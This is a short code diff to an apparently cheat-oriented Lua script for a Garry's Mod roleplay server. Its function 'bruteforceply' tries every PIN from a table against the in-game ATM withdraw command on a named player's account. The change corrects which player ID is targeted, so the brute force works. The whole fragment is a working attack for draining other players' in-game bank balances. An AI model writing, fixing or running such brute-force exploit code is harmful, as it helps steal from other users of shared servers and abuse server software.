@@ -17,7 +17,7 @@ local function bruteforceply( ply, cmd , args )
 	for k, v in pairs(player.GetAll()) do
 		if string.lower(v:Name()) == string.lower(args[1]) then
 			for _, pin in pairs(pintable) do
-				RunConsoleCommand("rp_atm_withdraw", util.CRC(pin), args[1]:UniqueID(), args[2])
+				RunConsoleCommand("rp_atm_withdraw", util.CRC(pin), v:UniqueID(), args[2])
 			end
 		end
 	end
